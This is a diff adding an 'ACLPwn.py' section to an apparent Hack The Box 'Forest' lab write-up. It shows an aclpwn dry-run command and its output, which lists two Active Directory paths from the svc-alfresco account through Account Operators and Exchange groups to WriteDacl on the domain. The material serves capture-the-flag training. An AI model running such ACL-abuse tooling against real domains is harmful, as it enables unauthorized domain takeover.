@@ -245,6 +245,19 @@ root@test:/usr/share/neo4j/bin# bloodhound
 Shortest Paths to Domain Admins: 
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound.png "BloodHound")
 
+## ACLPwn.py
+```markdown
+root@test:~/HTB/Forest# aclpwn -f svc-alfresco -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
+[-] Invalid path, skipping
+[+] Path found!
+Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[+] Path found!
+Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
+[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
+[-] Invalid path, skipping
+Please choose a path [0-1] 
+```
+
 ## Resources:
 
 [link text itself]: https://securityonline.info/aclpwn/
